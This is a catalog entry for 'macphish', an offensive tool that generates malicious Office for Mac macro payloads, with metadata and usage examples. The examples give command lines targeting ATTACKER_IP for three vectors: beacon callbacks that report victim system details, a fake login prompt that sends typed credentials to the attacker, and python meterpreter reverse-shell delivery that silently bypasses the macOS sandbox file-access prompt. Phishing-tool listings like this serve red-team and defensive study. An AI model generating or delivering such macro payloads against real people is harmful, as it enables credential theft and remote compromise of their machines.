---
name: "macphish"
categories:
  - spoof
version: "git (2025-09-25)"
homepage: "https://github.com/cldrn/macphish"
origin: "kitploit"
recipe: "upstream"
packaged-by: []
build-system: python
meta-checked: "2026-11-09"
github-repo: "cldrn/macphish"
github-stars: 244
github-pushed: "2025-09-25"
github-archived: false
github-match: "exact"
gh-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
worth: 3.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
license: see repository
github-issues: 3
---

# macphish

> Generates Office for Mac macro payloads — beacon callbacks, credential prompts and meterpreter delivery — from one Python script.

## What it's for

macphish builds malicious macro documents targeting Microsoft Office for macOS. Given a listening host (and port), it emits macros in four attack vectors: `beacon` (payload signals your listener and reports basic system information), `creds` (a credential-harvesting prompt that captures whatever the user types), `meterpreter` (a python meterpreter payload), and `meterpreter-grant` (same, but calls `GrantAccessToMultipleFiles()` first so the macro can touch files without tripping the macOS sandbox access prompt). Only python meterpreter payloads are currently supported. The `creds` vector can also generate the raw AppleScript for running it directly from a shell. This is payload generation only — you still deliver the macro document yourself.

## Typical use cases

### Generate a beacon payload

```bash
./macphish.py -lh ATTACKER_IP
```

Outcome: prints an Office for Mac macro that, when executed in a document, calls back to the listening host and reports basic information about the victim machine. The default transport is `curl`; wget and nslookup can be swapped in via the command template.

### Generate a credential-harvesting payload

```bash
./macphish.py -lh ATTACKER_IP -lp 8080 -a creds
```

Outcome: prints a macro that presents the victim a login/password prompt and sends the entered credentials to `ATTACKER_IP:8080`. The same vector can emit the raw AppleScript instead, for running the harvest directly from a shell.

### Generate a meterpreter payload with sandbox bypass

```bash
./macphish.py -lh ATTACKER_IP -lp 4444 -p python/meterpreter/reverse_tcp -a meterpreter-grant
```

Outcome: prints a macro that first calls `GrantAccessToMultipleFiles()` — pre-approving file access so the sandbox prompt never appears to the user — then runs the python meterpreter payload connecting back to `ATTACKER_IP:4444`. Use `-a meterpreter` to skip the grant call.

*No corpus evidence — derived from upstream documentation.*
